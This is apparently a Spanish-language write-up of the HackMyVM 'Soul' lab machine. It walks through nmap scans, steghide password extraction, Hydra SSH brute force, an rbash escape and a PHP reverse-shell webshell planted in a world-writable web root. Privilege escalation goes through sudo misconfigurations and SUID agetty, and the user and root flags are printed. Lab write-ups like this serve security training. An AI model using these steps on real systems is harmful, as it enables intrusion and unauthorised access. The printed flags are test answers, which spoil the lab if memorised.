---
icon: flag
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Soul HackMyVM (Hard - Linux)

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-10 04:55 EDT
Nmap scan report for 192.168.5.12
Host is up (0.00061s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 8a:e9:c1:c2:a3:44:40:26:6f:22:37:c3:fe:a1:19:f2 (RSA)
|   256 4f:4a:d6:47:1a:87:7e:69:86:7f:5e:11:5c:4f:f1:48 (ECDSA)
|_  256 46:f4:2c:28:53:ef:4c:2b:70:f8:99:7e:39:64:ec:07 (ED25519)
80/tcp open  http    nginx 1.14.2
|_http-server-header: nginx/1.14.2
|_http-title: Site doesn't have a title (text/html).
MAC Address: 08:00:27:E0:E2:4F (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.24 seconds
```

Veremos que hay un puerto `80` en el que aloja una pagina web, si entramos dentro de la misma veremos una imagen en grande, pero si seguimos mirando no veremos nada interesante en general en la pagina, por lo que vamos a realizar un poco de `fuzzing`.

Pero no veremos nada interesante, ya que solo hay una imagen, vamos a probar a extraer cualquier archivo que pueda esconder dentro de la misma.

## steghide

Primero nos descargaremos la imagen:

```shell
curl -O http://<IP>/saint.jpg
```

Ahora vamos a probar a extraer cualquier archivo que pueda contener.

```shell
steghide extract -sf saint.jpg
```

Dejamos la contraseña vacia.

Info:

```
Enter passphrase: 
wrote extracted data to "pass.txt".
```

Y veremos que ha funcionado, nos ha extraido un archivo llamado `pass.txt` lo que podemos creer que pueda ser la contraseña de algun usuario del sistema, pero como todavia no lo sabemos, vamos a realizar ppfuerza bruta para intentar sacar algunas credenciales.

## Escalate user

### Hydra

```shell
hydra -L <WORDLIST> -p lionsarebigcats ssh://<IP> -t 64 -I
```

Info:

```
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-05-11 03:29:03
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 64 tasks per 1 server, overall 64 tasks, 624370 login tries (l:624370/p:1), ~9756 tries per task
[DATA] attacking ssh://192.168.5.12:22/
[22][ssh] host: 192.168.5.12   login: daniel   password: lionsarebigcats
^CThe session file ./hydra.restore was written. Type "hydra -R" to resume session.
```

Veremos que ha funcionado y hemos obtenido las credenciales de `daniel`, por lo que nos conectaremos por `SSH`.

### SSH

```shell
ssh daniel@<IP>
```

Metemos como contraseña `lionsarebigcats` y veremos que estamos dentro.

## Escalate user

Si intentamos hacer algun comando como movernos, leer algo o lo que sea veremos que tenemos una `rbash`, por lo que vamos a intentar escapar de ella.

```
-rbash: cd: restricted
```

Si probamos a utilizar el `nano` veremos que nos funciona, por lo que vamos a obtener una `shell` con `nano`.

```shell
nano

#Dentro del nano
^R^X
reset; bash 1>&0 2>&0
```

Y con esto ya obtendremos una `shell` mucho mejor y sin restricciones.

Si listamos los permisos `SUID` que tenemos en el sistema veremos lo siguiente:

```shell
find / -type f -perm -4000 -ls 2>/dev/null
```

Info:

```
134620     64 -rwsr-xr-x   1 root     root        63568 Jan 10  2019 /usr/bin/su
   131121     64 -rwsr-xr-x   1 root     root        63736 Jul 27  2018 /usr/bin/passwd
   134473     44 -rwsr-xr-x   1 root     root        44440 Jul 27  2018 /usr/bin/newgrp
   134946     52 -rwsr-xr-x   1 root     root        51280 Jan 10  2019 /usr/bin/mount
   131120     84 -rwsr-xr-x   1 root     root        84016 Jul 27  2018 /usr/bin/gpasswd
   134948     36 -rwsr-xr-x   1 root     root        34888 Jan 10  2019 /usr/bin/umount
   131117     56 -rwsr-xr-x   1 root     root        54096 Jul 27  2018 /usr/bin/chfn
   150226    156 -rwsr-xr-x   1 root     root       157192 Feb  2  2020 /usr/bin/sudo
   131118     44 -rwsr-xr-x   1 root     root        44528 Jul 27  2018 /usr/bin/chsh
   134626     64 -rwsrws---   1 root     peter       64744 Jan 10  2019 /usr/sbin/agetty
   132307     52 -rwsr-xr--   1 root     messagebus    51184 Jul  5  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
   146938    428 -rwsr-xr-x   1 root     root         436552 Jan 31  2020 /usr/lib/openssh/ssh-keysign
   268129     12 -rwsr-xr-x   1 root     root          10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
```

Vemos una cosa interesante y es la siguiente linea:

```
134626  64 -rwsrws---   1 root   peter    64744 Jan 10  2019 /usr/sbin/agetty
```

Vemos que ese no es muy comun y si buscamos informacion de si tuviera alguna vulnerabilidad la encontraremos.

```shell
/usr/sbin/agetty -o -p -l /bin/bash -a root tty
```

Con esto deberiamos de ser `root`, pero si lo ejecutamos aparecera lo siguiente:

```
bash: /usr/sbin/agetty: Permission denied
```

Por lo que vemos no nos deja, ya que vemos que con este usuario poco podemos hacer, tendremos que ver el intentar escalar a otro usuario, pero al no ver opciones posibles vamos a meternos con el usuario `www-data` a ver si tiene algunos permisos mal configurados o algo por el estilo con el que podamos escalar.

## Escalate user www-data

Vamos a crear un `webshell.php` para podernos generar una `reverse shell`.

> NOTA

Utilizamos `PHP` ya que vemos que en el servidor esta instalado y se esta interpretando de forma correcta.

```shell
php -version
```

Info:

```
PHP 7.3.19-1~deb10u1 (cli) (built: Jul  5 2020 06:46:45) ( NTS )
Copyright (c) 1997-2018 The PHP Group
Zend Engine v3.3.19, Copyright (c) 1998-2018 Zend Technologies
    with Zend OPcache v7.3.19-1~deb10u1, Copyright (c) 1999-2018, by Zend Technologies
```

> webshell.php

```php
<?php
$sock=fsockopen("<IP>",<PORT>);$proc=proc_open("sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);
?>
```

Ahora nos vamos a dirigir a la siguiente ruta `/var/www/html` a parte si vamos ahi veremos una cosa interesante de permisos:

```
drwxrwxrwx  2 root root 4096 Nov 26  2020 html
```

Vemos que tiene todos los permisos activados, por lo que efectivamente si podremos depositar un archivo en la pagina web.

```shell
cd /var/www/html
chmod +x webshell.php
nano webshell.php

#Dentro del nano

#Metemos el contenido del Webshell.php
```

Lo guardamos y vamos a irnos a dicho archivo desde la `web` pero antes nos pondremos a la escucha.

```shell
nc -lvnp <PORT>
```

Una vez estando a la escucha nos meteremos en la `web` de la siguiente forma:

```
URL = http://<IP>/webshell.php
```

Pero veremos que nos lo descarga, por lo que no esta interpretando correctamente el `PHP` con la `IP`, vamos a ver la configuracion del servidor web a ver si interpreta `PHP` o no.

```shell
cat /etc/nginx/sites-available/default
```

Info:

```
............................<RESTO DE CODIGO>......................................
# Virtual Host configuration for example.com
#
# You can move that to a different file under sites-available/ and symlink that
# to sites-enabled/ to enable it.
#
server {
        listen 80;
        listen [::]:80;
#
        server_name lonelysoul.hmv;
#
        root /var/www/html;
        index index.html;
#
        location / {
                try_files $uri $uri/ =404;
        }

 # pass PHP scripts to FastCGI server
        #
               location ~ \.php$ {
               include snippets/fastcgi-php.conf;
        #
        #       # With php-fpm (or other unix sockets):
               fastcgi_pass unix:/run/php/php7.3-fpm.sock;
        #       # With php-cgi (or other tcp sockets):
        #       fastcgi_pass 127.0.0.1:9000;
        }
}
```

Vemos esa parte de ahi, si interpreta `PHP` pero solamente entrando por el dominio, no por la `IP` por lo que haremos lo siguiente:

```shell
nano /etc/hosts

#Dentro del nano
<IP>           lonelysoul.hmv
```

Ahora vamos a entrar por el `dominio` y directamente al archivo `PHP` que hemos creado, todo esto estando a la escucha.

```
URL = http://lonelysoul.hmv/webshell.php
```

Ahora si volvemos a donde tenemos la escucha, veremos lo siguiente:

```
listening on [any] 7777 ...
connect to [192.168.5.4] from (UNKNOWN) [192.168.5.12] 53274
whoami
www-data
```

Veremos que ha funcionado, por lo que vamos a sanitizar la `shell`.

### Sanitización de shell (TTY)

```shell
script /dev/null -c bash
```

```shell
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# Para ver las dimensiones de nuestra consola en el Host
stty size

# Para redimensionar la consola ajustando los parametros adecuados
stty rows <ROWS> columns <COLUMNS>
```

## Escalate user gabriel

Si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for www-data on soul:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on soul:
    (gabriel) NOPASSWD: /tmp/whoami
```

Veremos que podemos ejecutar el binario `whoami` como el usuario `gabriel` pero el binario esta en `/tmp` por lo que vamos a dicha carpeta.

Si vamos a `/tmp` veremos que no esta el binario, por lo que podremos crearlo y meter lo que queramos.

```shell
nano /tmp/whoami

#Dentro del nano
#!/bin/bash

bash -p
```

Lo guardamos y ahora lo ejecutaremo de la siguiente forma:

```shell
chmod +x /tmp/whoami
sudo -u gabriel /tmp/whoami
```

Info:

```
gabriel@soul:/tmp$ whoami
gabriel
```

Veremos que ha funcionado, por lo que leeremos la `flag` del usuario.

> user.txt

```
HMViwazhere
```

## Escalate user peter

Si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for gabriel on soul:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User gabriel may run the following commands on soul:
    (peter) NOPASSWD: /usr/sbin/hping3
```

Veremos que podemos ejecutar el binario `/usr/sbin/hping3` como el usuario `peter`, por lo que haremos lo siguiente:

```shell
sudo -u peter hping3
/bin/bash
```

Info:

```
peter@soul:/home/gabriel$ whoami
peter
```

Veremos que con eso seremos dicho usuario.

## Escalate Privileges

Recordemos que antes vimos los permisos `SUID` que no podiamos ejecutar, pero ahora somos el usuario `peter` y si podemos ejecutarlo con el, por lo que ejecutaremos lo siguiente para ser `root`.

```shell
/usr/sbin/agetty -o -p -l /bin/bash -a root tty
```

Info:

```
Debian GNU/Linux 10 soul tty

soul login: root (automatic login)

bash-5.0# whoami
root
```

Y con esto veremos que ya seremos `root` por lo que leeremos la `flag` de `root`.

> rootflag.txt

```
HMVohmygod
```
